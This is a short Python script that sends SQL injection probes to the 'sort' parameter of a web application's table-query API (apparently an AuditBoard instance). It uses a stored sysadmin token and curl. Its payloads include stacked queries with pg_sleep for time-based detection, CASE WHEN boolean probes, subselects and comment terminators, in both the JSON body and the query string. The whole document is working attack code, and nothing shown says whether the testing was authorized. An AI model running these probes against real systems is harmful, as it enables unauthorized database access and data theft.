import json,subprocess,os,time
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-AuditBoard-Source: SchemaTable Rows','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== sort / order injection (raw string -> ORDER BY) ===")
sorts=[
 "email","-email","email ASC","email;SELECT pg_sleep(3)",
 "(SELECT 1)","email,(SELECT 1)","CASE WHEN 1=1 THEN email ELSE id END",
 "email--","email/**/","1","(CASE WHEN (1=1) THEN email ELSE id END)",
]
for s in sorts:
    body={"ab:query":{"entities":["user"],"filter":{},"include":["user"],"sort":s}}
    t0=time.time()
    c,b=post('/api/v1/table/query?entities=user',body)
    dt=round(time.time()-t0,2)
    n=0
    try: n=len(json.loads(b).get('included') or [])
    except: pass
    print(f"  sort={s[:40]:42} {c:>4} rows={n:<4} t={dt}s  {b[:70].replace(chr(10),' ')}")
print()
print("=== query-string sort param ===")
for s in ["email","email;SELECT 1","(SELECT 1)","email--"]:
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+f'/api/v1/table/query?entities=user&sort={s}',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-AuditBoard-Source: SchemaTable Rows',
         '-d',json.dumps({"ab:query":{"entities":["user"],"filter":{},"include":["user"]}})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    b=open('/tmp/b',encoding='utf-8',errors='replace').read()
    print(f"  ?sort={s[:30]:32} {c:>4}  {b[:70].replace(chr(10),' ')}")
